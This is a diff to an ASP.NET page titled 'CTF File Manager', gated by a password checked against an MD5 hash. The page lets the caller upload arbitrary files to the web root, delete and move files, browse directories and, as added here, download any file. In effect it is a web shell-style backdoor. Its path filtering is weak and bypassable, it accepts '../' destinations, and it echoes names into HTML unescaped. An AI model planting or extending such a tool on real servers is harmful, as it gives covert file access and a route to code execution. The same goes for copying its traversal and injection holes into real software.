@@ -16,7 +16,6 @@
         if (string.IsNullOrEmpty(inputPass) || !VerifyMD5(inputPass, correctMD5))
         {
             Response.StatusCode = 403;
-            Response.StatusDescription = "Forbidden";
             Response.Write("<h1>403 Forbidden</h1>");
             Response.End();
         }
@@ -24,53 +23,69 @@
         currentPath = Request.QueryString["dir"] ?? "";
         currentPath = currentPath.Trim('/', '\\').Replace("..", "").Replace("\\", "/");
 
-        // Handle Delete
+        // ====================== DOWNLOAD ======================
+        if (Request.QueryString["action"] == "download" && !string.IsNullOrEmpty(Request.QueryString["file"]))
+        {
+            DownloadFile(Request.QueryString["file"]);
+        }
+
+        // ====================== DELETE ======================
         if (!string.IsNullOrEmpty(Request.QueryString["del"]))
         {
             DeleteFile(Request.QueryString["del"]);
-            Response.Redirect(GetCurrentUrl() + "&msg=deleted");
+            Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=deleted");
         }
 
-        // Handle Move
+        // ====================== MOVE ======================
         if (Request.QueryString["action"] == "move" && !string.IsNullOrEmpty(Request.QueryString["target"]))
         {
             MoveFile(Request.QueryString["target"], Request.QueryString["dest"]);
-            Response.Redirect(GetCurrentUrl() + "&msg=moved");
+            Response.Redirect("?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath) + "&msg=moved");
         }
 
         if (Request.QueryString["msg"] != null)
             lblMsg.Text = "<span style='color:lime'>✅ Operation Successful!</span>";
     }
 
-    string GetCurrentUrl()
-    {
-        return "?p=" + Request.QueryString["p"] + "&dir=" + Server.UrlEncode(currentPath);
-    }
-
     bool VerifyMD5(string input, string correctHash)
     {
         using (MD5 md5 = MD5.Create())
         {
-            byte[] hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
-            StringBuilder sb = new StringBuilder();
-            foreach (byte b in hashBytes) sb.Append(b.ToString("x2"));
-            return sb.ToString().Equals(correctHash, StringComparison.OrdinalIgnoreCase);
+            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
+            return BitConverter.ToString(hash).Replace("-", "").ToLower() == correctHash.ToLower();
         }
     }
 
-    string GetFullPhysicalPath(string relative)
+    string GetFullPath(string relative)
     {
-        string path = "~/" + currentPath;
-        if (!string.IsNullOrEmpty(currentPath)) path += "/";
-        return Server.MapPath(path + relative);
+        string p = "~/" + currentPath;
+        if (!string.IsNullOrEmpty(currentPath)) p += "/";
+        return Server.MapPath(p + relative);
+    }
+
+    void DownloadFile(string fileName)
+    {
+        try
+        {
+            string fullPath = GetFullPath(Server.UrlDecode(fileName));
+            if (File.Exists(fullPath))
+            {
+                Response.Clear();
+                Response.ContentType = "application/octet-stream";
+                Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Server.UrlEncode(Path.GetFileName(fullPath)) + "\"");
+                Response.TransmitFile(fullPath);
+                Response.End();
+            }
+        }
+        catch { }
     }
 
     void DeleteFile(string fileName)
     {
         try
         {
-            string path = GetFullPhysicalPath(Server.UrlDecode(fileName));
-            if (File.Exists(path)) File.Delete(path);
+            string fullPath = GetFullPath(Server.UrlDecode(fileName));
+            if (File.Exists(fullPath)) File.Delete(fullPath);
         }
         catch { }
     }
@@ -79,8 +94,8 @@
     {
         try
         {
-            string source = GetFullPhysicalPath(Server.UrlDecode(sourceFile));
-            string destDir = GetFullPhysicalPath(Server.UrlDecode(destFolder));
+            string source = GetFullPath(Server.UrlDecode(sourceFile));
+            string destDir = GetFullPath(Server.UrlDecode(destFolder));
             string dest = Path.Combine(destDir, Path.GetFileName(source));
 
             if (File.Exists(source) && Directory.Exists(destDir))
@@ -96,12 +111,9 @@
             try
             {
                 string fileName = Path.GetFileName(FileUpload1.FileName);
-                string savePath = GetFullPhysicalPath(fileName);
-                
+                string savePath = GetFullPath(fileName);
                 FileUpload1.SaveAs(savePath);
-                
-                // Instead of redirect, reload same page with success message
-                lblMsg.Text = "<span style='color:lime;font-weight:bold'>✅ File uploaded successfully: " + fileName + "</span>";
+                lblMsg.Text = "<span style='color:lime'>✅ Uploaded: " + fileName + "</span>";
             }
             catch (Exception ex)
             {
@@ -124,19 +136,18 @@
         a:hover { color: white; }
         .dir { color: #ffff00; font-weight: bold; }
         .current-path { background:#111; padding:10px; border:1px solid #00ff00; margin:10px 0; }
-        .actions a { margin-right: 15px; }
-        .upload-box, .move-box { border: 2px dashed #00ff00; padding: 15px; background: #111; margin:15px 0; }
+        .actions a { margin-right: 12px; }
+        .upload-box { border: 2px dashed #00ff00; padding: 15px; background: #111; margin:15px 0; }
     </style>
 </head>
 <body>
     <h1>🛠️ CTF File Manager</h1>
 
     <div class="current-path">
-        <strong>Current Path:</strong> /<%= currentPath %> 
-        <a href="?p=<%= Request.QueryString["p"] %>">[ Root ]</a>
+        <strong>Path:</strong> /<%= currentPath %> 
+        <a href="?p=<%= Request.QueryString["p"] %>">[Root]</a>
     </div>
 
-    <!-- Upload Section -->
     <div class="upload-box">
         <h2>Upload File</h2>
         <form runat="server" enctype="multipart/form-data">
@@ -147,7 +158,7 @@
         </form>
     </div>
 
-    <h2>📁 Directory Listing</h2>
+    <h2>📁 Files & Folders</h2>
     <table>
         <tr>
             <th>Name</th>
@@ -157,12 +168,9 @@
             <th>Actions</th>
         </tr>
 
-        <% 
-            string physicalPath = Server.MapPath("~/" + currentPath);
-            
-            if (!string.IsNullOrEmpty(currentPath))
-            {
-                string parent = currentPath.Contains("/") ? currentPath.Substring(0, currentPath.LastIndexOf("/")) : "";
+        <!-- Parent -->
+        <% if (!string.IsNullOrEmpty(currentPath)) { 
+            string parent = currentPath.Contains("/") ? currentPath.Substring(0, currentPath.LastIndexOf("/")) : "";
         %>
         <tr>
             <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(parent) %>">.. (Go Up)</a></td>
@@ -173,9 +181,12 @@
         </tr>
         <% } %>
 
-        <% foreach (var dir in Directory.GetDirectories(physicalPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
-           {
-               string newPath = string.IsNullOrEmpty(currentPath) ? dir.Name : currentPath + "/" + dir.Name;
+        <!-- Folders -->
+        <% 
+            string physicalPath = Server.MapPath("~/" + currentPath);
+            foreach (var dir in Directory.GetDirectories(physicalPath).Select(d => new DirectoryInfo(d)).OrderBy(d => d.Name))
+            {
+                string newPath = string.IsNullOrEmpty(currentPath) ? dir.Name : currentPath + "/" + dir.Name;
         %>
         <tr>
             <td class="dir">📁 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(newPath) %>"><%= dir.Name %></a></td>
@@ -186,6 +197,7 @@
         </tr>
         <% } %>
 
+        <!-- Files -->
         <% foreach (var file in Directory.GetFiles(physicalPath).Select(f => new FileInfo(f)).OrderBy(f => f.Name))
            {
                string encoded = Server.UrlEncode(file.Name);
@@ -196,9 +208,9 @@
             <td><%= (file.Length / 1024.0).ToString("0.##") %> KB</td>
             <td><%= file.LastWriteTime.ToString("yyyy-MM-dd HH:mm") %></td>
             <td class="actions">
-                <a href="<%= string.IsNullOrEmpty(currentPath) ? "" : currentPath + "/" %><%= file.Name %>" download>⬇️ Download</a>
+                <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&action=download&file=<%= encoded %>">⬇️ Download</a>
                 <a href="?p=<%= Request.QueryString["p"] %>&dir=<%= Server.UrlEncode(currentPath) %>&del=<%= encoded %>" 
-                   onclick="return confirm('Delete?')">🗑️ Delete</a>
+                   onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                 <a href="javascript:void(0)" onclick="moveFile('<%= encoded %>')">🔀 Move</a>
             </td>
         </tr>
@@ -206,14 +218,14 @@
     </table>
 
     <!-- Move Form -->
-    <div class="move-box" id="moveForm" style="display:none;">
+    <div class="upload-box" id="moveForm" style="display:none;">
         <h2>Move File</h2>
         <form method="get">
             <input type="hidden" name="p" value="<%= Request.QueryString["p"] %>" />
             <input type="hidden" name="dir" value="<%= currentPath %>" />
             <input type="hidden" name="action" value="move" />
             <input type="hidden" id="source" name="target" />
-            Move to: <input type="text" name="dest" placeholder="foldername or ../folder" style="width:320px;padding:6px;"/>
+            To Folder: <input type="text" name="dest" placeholder="folder or ../folder" style="width:300px;padding:6px;"/>
             <input type="submit" value="Move" />
             <button type="button" onclick="document.getElementById('moveForm').style.display='none'">Cancel</button>
         </form>
